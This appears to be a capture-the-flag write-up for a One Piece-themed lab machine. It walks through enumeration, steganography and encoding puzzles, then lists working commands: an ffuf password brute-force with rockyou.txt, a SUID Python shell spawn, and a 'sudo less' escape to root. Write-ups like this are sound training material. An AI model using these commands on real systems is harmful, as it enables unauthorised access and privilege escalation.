## **1. Initial Reconnaissance**

I began with an `nmap` scan of the target machine:

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             187 Jul 26  2020 welcome.txt
| ftp-syst: [...]
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: New World
```

Key takeaways:
- **FTP** allows anonymous login.
- **SSH** is running an outdated OpenSSH version.
- The **web server** serves a page titled *“New World.”*

---

## **2. Web & FTP Enumeration**

### **HTML Source Clue**
Inside the web page’s source code, I found:
> `Nami ensures there are precisely 3472 possible places where she could have lost it.`

This was later confirmed to be part of an **OSINT challenge**, though it didn’t yield immediate results.

### **FTP Exploration**
Anonymous FTP access provided two files:

- **`welcome.txt`**  
  > *“Welcome to Zou. It is an island located on the back of a massive, millennium-old elephant named Zunesha that roams the New World. Except this, there is not much to say about this island.”*

- **`.notes.txt`**  
  > *“Hagrid told me that spells names are not good since they will not 'rock you'”*  
  > *“Hermonine loves historical text editors along with reading old books.”*  
  → This hints at the **`rockyou.txt`** wordlist and possibly **Vim/Emacs**.

A hidden directory, **`.the_whale_tree`**, contained:
- **`.secret_room.txt`**: A dialogue referencing **Road Poneglyphs**—ancient stones that hold clues to **Laugh Tale** and the **One Piece**.

### **First Poneglyph — Steganography**
Inside `.the_whale_tree`, an image named **`.road_poneglyph.jpg`** contained what appeared to be a **Base32-encoded string**:
```
FUWS2LJNEAWS2LJNFUQC4LJNFUWSALRNFUWS2IBN... (truncated)
```

Using **CyberChef** with the decoding chain:  
**From Base32 → Morse Code → Binary → Hex → Base58 → Base64**,  
I obtained:  
> `3HTXi9i2T2`

At the time, this seemed like a red herring.

---

## **3. GitHub & Web Fuzzing**

A hint pointed me to a GitHub repository:
- https://github.com/1FreyR/LogPose/blob/master/LogPose.txt

Initial directory fuzzing yielded nothing, but after retrying with extensions `.html`, `.php`, and `.txt`, I discovered:
- **`/dr3ssr0s4.html`**

From **`/images/rabbit_hole.png`**, hex analysis revealed:
```
6b 65 79 3a 69 6d 20 6f 6e 20 6f 74 69 20 6f 74 69
```
→ Decodes to:  
> `key:im on oti oti`  
(Unclear meaning—possibly a distraction.)

The site’s CSS referenced **`/king_kong_gun.jpg`**, which contained a comment:
> `Doflamingo is /ko.jpg`

Downloading **`/ko.jpg`** and running `strings` exposed a hidden PHP file:
> **`/wh0l3_c4k3.php`**

---

## **4. Cookie Manipulation & Second Poneglyph**

By changing my session cookie to:
```
CakeForYou
```
I gained access to **`/wh0l3_c4k3.php`**, which displayed another encoded block identical in format to the first Poneglyph.

Decoding it (same CyberChef chain) gave:
> `55L9sMDppfRjUzVV11Uac`

Still no clear use—but I pressed on.

---

## **5. Game Page & Credential Discovery**

Fuzzing uncovered:
- **`/r4nd0m.html`**, hosting two browser-based games.

One game’s JavaScript (`buggy_games/brain_teaser.js`) contained:
> **`/0n1g4sh1m4.php`**

The game logic prevented winning—likely intentional.

Separately, I noticed **`kaido.jpeg`** (the only `.jpeg` file; others were `.jpg`). Its metadata (via `exiftool` or `strings`) leaked a username:
> **`K1ng_0f_th3_B3@sts`**

I used this in a `ffuf` brute-force against the login form:
```bash
ffuf -u http://10.48.159.231/0n1g4sh1m4.php \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "user=K1ng_0f_th3_B3%40sts&password=FUZZ&submit_creds=Login" \
  -w /opt/rockyou.txt -fs 1503
```

The correct password was:
> **`thebeast`**

This granted access to the **third Road Poneglyph**—another long encoded string.

---

## **6. Final Poneglyph & Full Decryption**

I was stuck decoding the third Poneglyph—until consulting a writeup revealed a hidden endpoint:
> **`/unspecified`**

This contained the **fourth (final) Road Poneglyph**.

Applying the same CyberChef recipe:
```
From_Base32 → From_Morse_Code → From_Binary → From_Hex → From_Base58 → From_Base64
```

The final output was:
> **`M0nk3y_D_7uffy:1_w1ll_b3_th3_p1r@t3_k1ng!`**

These were valid **SSH credentials**.

---

## **7. Privilege Escalation**

### **Initial Foothold**
SSH login as `M0nk3y_D_7uffy` succeeded.

### **SUID Binary Abuse**
Enumerating SUID binaries revealed:
```bash
-rwsr-xr-x 1 7uffy_vs_T3@ch teach 4526456 Jul 17 2020 /usr/bin/gomugomunooo_king_kobraaa
```

Running `strings` on it showed references to Python execution. Although Python wasn’t directly available, the binary accepted code via `-c`.

I abused it to spawn a shell:
```bash
/usr/bin/gomugomunooo_king_kobraaa -c 'import os; os.setresuid(1000, 1000, 1000); os.system("/bin/sh")'
```

This elevated me to user **`7uffy_vs_T3@ch`**.

### **Root via `sudo less`**
Further enumeration showed:
```bash
(7uffy_vs_T3@ch) NOPASSWD: /usr/local/bin/less
```

I escalated to root by running:
```bash
sudo /usr/local/bin/less /etc/passwd
```
Then typing `:!sh` inside `less` → **root shell obtained**.

*(Alternative: Appending a reverse shell payload to the `less` binary also worked.)*

Root flag retrieved. **Machine owned.**

---

## **Summary of Techniques Used**
- **Anonymous FTP** for initial data leakage.
- **Steganography** and **multi-layer encoding** (Base32 → Morse → Binary → Hex → Base58 → Base64).
- **Cookie manipulation** to access hidden pages.
- **Metadata analysis** of image files to extract usernames.
- **Password brute-forcing** with `ffuf` and `rockyou.txt`.
- **Custom SUID binary exploitation** via embedded Python.
- **Privilege escalation** through misconfigured `sudo` rights on `less`.

This CTF masterfully wove **One Piece lore** into classic penetration testing techniques—making it both challenging and thematically rich.

---
